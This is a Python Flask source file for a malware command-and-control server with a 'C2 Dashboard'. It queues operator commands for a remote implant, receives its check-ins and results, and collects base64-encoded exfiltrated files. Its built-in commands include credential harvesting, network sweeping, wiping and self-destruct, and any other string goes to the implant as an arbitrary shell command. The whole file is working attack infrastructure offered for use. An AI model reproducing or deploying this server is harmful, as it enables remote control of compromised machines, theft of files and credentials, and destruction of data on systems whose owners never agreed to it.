from flask import Flask, request, jsonify
import os
import uuid

app = Flask(__name__)

# --- STATE --- #
commandQ = []
tasks = {}
results = []
allowedCommands = ["whoami", "hostname", "pwd", "shutdown", "wipe", "bash", "read", "write", "execute", "full_chain", "network_sweep", "credential_harvest", "self_destruct"]

# --- ENDPOINTS --- #
@app.route("/")
def home():
    html = "<h1>C2 Dashboard</h1>"
    
    # Command Submission Form
    html += "<h2>Send Command</h2>"
    html += "<form action='/add_command' method='GET'>"
    html += "<input type='text' name='cmd' placeholder='whoami' style='width:300px; padding:5px;' autofocus>"
    html += "<button type='submit' style='padding:5px;'>Queue</button>"
    html += "</form>"
    
    # Pending Queue
    html += "<h2>Pending Queue</h2>"
    if commandQ:
        html += "<ul>" + "".join(f"<li>{cmd}</li>" for cmd in commandQ) + "</ul>"
    else:
        html += "<p><i>Empty</i></p>"
        
    # Results Log
    html += "<h2>Execution Results</h2>"
    if not results:
        html += "<p><i>No results yet</i></p>"
    for r in reversed(results):
        html += f"<h3>{r.get('cmd', 'Unknown')} <small>(Task {r.get('taskID', 'N/A')})</small></h3>"
        html += f"<pre style='background:#222; color:#0f0; padding:15px; border-radius:5px; overflow-x:auto;'>{r.get('output', '')}</pre>"
        
    return html

@app.route("/checkin", methods=["POST"])
def checkin():
    data = request.json
    print("[+] Check-in received:", data)
    results.append({"cmd": "checkin", "taskID": "SYSTEM", "output": f"Check-in from host: {data.get('host', 'Unknown')}"})
    return jsonify({"status": "ok"})

#takes the first command on the command queue and issues the task to the implant.
@app.route("/command", methods=["GET"])
def command():
    if not commandQ:
        return jsonify({"status": "No Commands Queued"})
    cmd = commandQ.pop(0)
    taskID = str(uuid.uuid4())[:8]
    tasks[taskID] = cmd
    print(f'[+] Issuing task {taskID}: {cmd}')
    return jsonify({"taskID": taskID, "command": cmd})

#adds a command to the queue. Can be triggered via GET ?cmd=whoami or POST {"command":"whoami"}
@app.route("/add_command", methods=["GET", "POST"])
def add_command():
    if request.method == "POST":
        data = request.json
        cmd = data.get("command")
    else:
        cmd = request.args.get("cmd")
        
    if not cmd:
        return jsonify({"error": "No command provided."}), 400

    # allow builtin commands OR arbitrary shell commands if they aren't explicitly blocked
    is_builtin = cmd in allowedCommands or cmd.startswith("exfil ")
    is_shell = not is_builtin # Anything else goes to runCommand in Persistent.cpp
    
    commandQ.append(cmd)
    print(f'[+] Command added to queue: {cmd}')
    
    if request.method == "GET":
        return f"<h1>Command added: {cmd}</h1><p><a href='/'>Return to Dashboard</a></p><script>setTimeout(() => window.location.href='/', 1000);</script>"
    return jsonify({"status": "command added", "command": cmd})

@app.route("/result", methods=["POST"])
def result():
    data = request.json
    taskID = data.get("taskID", "N/A")
    output = data.get("output", "")
    cmd = tasks.get(taskID, "initial_recon_or_unknown")
    print(f"[+] Result received for {taskID} {cmd}: {output}")
    
    results.append({"taskID": taskID, "cmd": cmd, "output": output})
    return jsonify({"status": "received"})

@app.route("/exfil", methods=["POST"])
def exfil():
    data = request.json
    filename = data.get("filename", "unknown_file")
    b64data = data.get("data", "")
    print(f"[+] Exfil received: {filename}")
    
    results.append({"taskID": "EXFIL", "cmd": f"exfil {filename}", "output": f"[Base64 Payload]\n{b64data}"})
    return jsonify({"status": "received"})

# --- RUN --- #
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)